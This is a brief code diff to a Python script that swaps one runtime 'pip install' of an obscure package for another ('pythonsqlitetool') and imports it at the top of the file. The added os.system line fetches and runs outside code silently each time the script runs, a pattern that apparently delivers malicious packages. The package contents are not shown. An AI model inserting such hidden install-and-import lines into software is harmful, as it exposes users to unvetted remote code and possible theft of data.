@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycoloringpkgsV2")
-import pycoloringpkgsV2
+os.system("pip install pythonsqlitetool")
+import pythonsqlitetool
 from optparse import Option
 import requests
 import threading
